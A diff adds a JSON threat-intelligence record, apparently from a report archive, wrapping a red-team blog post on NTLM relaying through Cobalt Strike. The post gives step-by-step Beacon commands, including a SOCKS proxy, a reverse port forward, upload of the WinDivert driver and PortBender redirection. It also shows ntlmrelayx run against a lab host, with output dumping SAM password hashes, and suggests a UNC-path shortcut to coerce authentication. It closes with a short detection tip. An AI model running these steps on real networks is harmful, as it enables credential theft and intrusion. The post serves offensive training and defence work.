@@ -1,0 +1,83 @@
+{
+    "id": "830ff572-ceb9-458c-9dda-f5af366541fa",
+    "created_at": "2023-01-12T15:00:33.940801Z",
+    "updated_at": "2025-03-27T02:09:29.33824Z",
+    "deleted_at": null,
+    "sha1_hash": "afac05c0f0540a99fcab8e65897e923e4b612dae",
+    "title": "2021-07-29 - NTLM Relaying via Cobalt Strike",
+    "authors": "",
+    "file_creation_date": "2022-05-28T16:14:13Z",
+    "file_modification_date": "2022-05-28T16:14:13Z",
+    "file_size": 121864,
+    "plain_text": "# NTLM Relaying via Cobalt Strike\n\n**rastamouse.me/ntlm-relaying-via-cobalt-strike/**\n\n[Blog / July 29, 2021 / Rasta Mouse](https://rastamouse.me/category/blog/)\n\n\nJuly 29, 2021\n\n\nNTLM relaying is a popular attack strategy during a penetration test and is really trivial to\nperform. Just roll up at the client site, plug your laptop into the LAN, fire up responder and\nntlmrelayx, and away you go.\n\nThe majority of opportunistic relays come when a user or a machine tries to access an SMB\nresource that doesn’t exist. It therefore sends broadcast requests which tools like responder\nwill send poisoned responses for. There are tactics to coerce requests that specifically target\nthe address you’re listening on. For instance – create a Windows shortcut with the icon set to\na UNC path (e.g. \\\\attacker-ip\\pwn.icon), place it in a network share and wait for a user to\nbrowse that share. And there are also services that are vulnerable to relaying in their default\n[configuration, such as Active Directory Certificate Services.](https://posts.specterops.io/certified-pre-owned-d95910965cd2)\n\nIt’s probably safe to say that NTLM relaying isn’t going to vanish anytime soon. However,\nrelaying through a C2 framework is a bit less trivial for a few reasons. Assuming you’ve\ncompromised a Windows endpoint:\n\nPort 445 is already bound by the OS, so you can’t simply sniff incoming traffic.\nThe popular Python tools won’t run natively on Windows.\n\nThis second point is easy to solve, we can just run them on a local Linux VM or WSL, and\ntunnel the traffic to it. Redirecting the incoming traffic on port 445 is the slightly tricky part, but\n[is possible using a tool such as WinDivert. This is a driver (yes, a driver) which is capable of](https://github.com/basil00/Divert)\nintercepting and redirecting incoming network packets before they can hit the underlying\nservices.\n\nThere are multiple projects out there that leverage WinDivert to achieve this style of traffic\n[redirection in post-ex tools, including DivertTCPconn,](https://github.com/Arno0x/DivertTCPconn) [StreamDivert, and](https://github.com/jellever/StreamDivert) [PortBender.](https://github.com/praetorian-inc/PortBender)\nDivertTCPconn & StreamDivert compile to an EXE and PortBender to a reflective DLL. Both\nare generic enough implementations that can be run via practically any C2 framework,\nthough PortBender has the added perk of including an Aggressor Script.\n\nThese tools allow us to direct traffic incoming on port 445 to another, arbitrary local port. On\nthis port, we can start a reverse port forward which will redirect the traffic again to a location\nwhere the relay tools are running.\n\n\n-----\n\nCobalt Strike does have an rportfwd command, which will bind a port on the compromised\nmachine, tunnel that traffic back to the team server, and forward it to the specified IP and\nport. The inconvenience is that it requires that your relaying tools are running on either the\nteam server itself, or on another machine that is routable from the team server.\n\nThe rportfwd_local command differs in that instead of tunnelling the traffic only as far as the\nteam server, it will be forwarded to the machine running the Cobalt Strike client of the\noperator who started it. This means that you can run the relaying tools in a VM or in WSL of\nyour own machine. Baller.\n\nFinally, for the relaying tool to send traffic back into the target network, we can just use the\n**socks command.**\n\nThe traffic flow will look something like this:\n\n\n-----\n\nPretty trippy. Let’s see it in action.\n\nI generally set the attack up in reverse order. You want everything up and running before the\ntraffic is redirected so you don’t miss anything.\n\n1. Start the SOCKS proxy.\n```\nbeacon> socks 1080\n[+] started SOCKS4a server on: 1080\n\n```\n\n-----\n\n2. Run ntlmrelayx inside proxychains. In this example, 10.10.17.68 is the target machine.\n```\n[email protected]:~# proxychains python3 /usr/local/bin/ntlmrelayx.py -t\nsmb://10.10.17.68\n-smb2support\n[*] Protocol Client RPC loaded..\n[*] Protocol Client HTTP loaded..\n[*] Protocol Client HTTPS loaded..\n[*] Protocol Client SMTP loaded..\n[*] Protocol Client DCSYNC loaded..\n[*] Protocol Client IMAPS loaded..\n[*] Protocol Client IMAP loaded..\n[*] Protocol Client LDAPS loaded..\n[*] Protocol Client LDAP loaded..\n[*] Protocol Client MSSQL loaded..\n[*] Protocol Client SMB loaded..\n[*] Running in relay mode to single host\n[*] Setting up SMB Server\n[*] Setting up HTTP Server\n[*] Setting up WCF Server\n[*] Servers started, waiting for connections\n\n```\n3. Start the reverse port forward on the same machine that will run PortBender. 172.20.77.73\nis the IP address that my WSL Ubuntu image has.\n```\nbeacon> rportfwd_local 8445 172.20.77.73 445\n[+] started reverse port forward on 8445 to rasta -> 172.20.77.73:445\n\n```\n4. Upload WinDivert64.sys (or WinDiver32.sys depending on the target arch), and then run\nPortBender.\n\nLocal admin access is required to load the driver, so this Beacon is running as SYSTEM.\n```\nbeacon> getuid\n[*] You are NT AUTHORITY\\SYSTEM (admin)\nbeacon> pwd\n[*] Current directory is C:\\Windows\\system32\\drivers\nbeacon> upload C:\\Tools\\PortBender\\WinDivert64.sys\nbeacon> PortBender redirect 445 8445\n[+] Launching PortBender module using reflective DLL injection\nInitializing PortBender in redirector mode\nConfiguring redirection of connections targeting 445/TCP to 8445/TCP\n\n```\nWhen port 445 receives a connection, PortBender will report it in the Beacon console. When\nthis happens, check ntlmrelayx!\n```\nNew connection from 10.10.17.132:49937 to 10.10.17.25:445\nDisconnect from 10.10.17.132:49937 to 10.10.17.25:445\n\n```\n\n-----\n\nAs expected, the traffic has been tunnelled all the way to my WSL instance where ntlmrelayx\nis listening; and it has relayed the traffic to the target machine back on the internal network.\nBy default, it dumps the local SAM database.\n```\n[*] Servers started, waiting for connections\n[*] SMBD-Thread-4: Connection from DEV/[email protected] controlled, attacking target\nsmb://10.10.17.68\n|S-chain|-<>-10.10.5.120:1080-<><>-10.10.17.68:445-<><>-OK\n[*] Authenticating against smb://10.10.17.68 as DEV/NLAMB SUCCEED\n[*] SMBD-Thread-4: Connection from DEV/[email protected] controlled, but there are no\nmore targets left!\n[*] Service RemoteRegistry is in stopped state\n[*] Starting service RemoteRegistry\n[*] Target system bootKey: 0x20c5ee68f38fa77abdb7912a6dcc042a\n[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:b423cdd3ad21718de4490d9344afef72:::\nGuest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nDefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::\n[*] Done dumping SAM hashes for host: 10.10.17.68\n[*] Stopping service RemoteRegistry\n\n```\nTo stop PortBender, use the jobs command to list the running job. This will give you the job\nID (JID) and an associated PID. Use jobkill <jid> to stop the job, and then kill <pid> to\nclose the spawned process.\n\nAs well as the usual MS guidance for NTLM relay mitigation, one may wish to look for the\nWinDivert driver load events (Sysmon Event ID 6).\n\n[This blog post was written using the lab from my Red Team Ops course.](https://www.zeropointsecurity.co.uk/red-team-ops)\n\n[cobalt-strike,](https://rastamouse.me/tag/cobalt-strike/) [ntlm-relay](https://rastamouse.me/tag/ntlm-relay/)\n\n**[Rasta Mouse](https://rastamouse.me/author/rasta_mouse/)**\n\n\n-----",
+    "language": "EN",
+    "sources": [
+        {
+            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
+            "created_at": "2023-01-12T14:38:44.599904Z",
+            "updated_at": "2023-01-12T14:38:44.599904Z",
+            "deleted_at": null,
+            "name": "VXUG",
+            "url": "https://www.vx-underground.org",
+            "description": "vx-underground Papers",
+            "reports": null
+        }
+    ],
+    "references": [
+        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-07-29 - NTLM Relaying via Cobalt Strike.pdf"
+    ],
+    "report_names": [
+        "2021-07-29 - NTLM Relaying via Cobalt Strike.pdf"
+    ],
+    "threat_actors": [
+        {
+            "id": "610a7295-3139-4f34-8cec-b3da40add480",
+            "created_at": "2023-01-06T13:46:38.608142Z",
+            "updated_at": "2025-03-27T02:00:02.87217Z",
+            "deleted_at": null,
+            "main_name": "Cobalt",
+            "aliases": [
+                "Cobalt Gang",
+                "GOLD KINGSWOOD",
+                "COBALT SPIDER",
+                "G0080",
+                "Mule Libra",
+                "Cobalt Group"
+            ],
+            "source_name": "MISPGALAXY:Cobalt",
+            "tools": [],
+            "source_id": "MISPGALAXY",
+            "reports": null
+        },
+        {
+            "id": "aa73cd6a-868c-4ae4-a5b2-7cb2c5ad1e9d",
+            "created_at": "2022-10-25T16:07:24.139848Z",
+            "updated_at": "2025-03-27T02:02:10.120505Z",
+            "deleted_at": null,
+            "main_name": "Safe",
+            "aliases": [],
+            "source_name": "ETDA:Safe",
+            "tools": [
+                "DebugView",
+                "LZ77",
+                "OpenDoc",
+                "SafeDisk",
+                "TypeConfig",
+                "UPXShell",
+                "UsbDoc",
+                "UsbExe"
+            ],
+            "source_id": "ETDA",
+            "reports": null
+        }
+    ],
+    "ts_created_at": 1673535633,
+    "ts_updated_at": 1743041369,
+    "ts_creation_date": 1653754453,
+    "ts_modification_date": 1653754453,
+    "files": {
+        "pdf": "https://archive.orkl.eu/afac05c0f0540a99fcab8e65897e923e4b612dae.pdf",
+        "text": "https://archive.orkl.eu/afac05c0f0540a99fcab8e65897e923e4b612dae.txt",
+        "img": "https://archive.orkl.eu/afac05c0f0540a99fcab8e65897e923e4b612dae.jpg"
+    }
+}
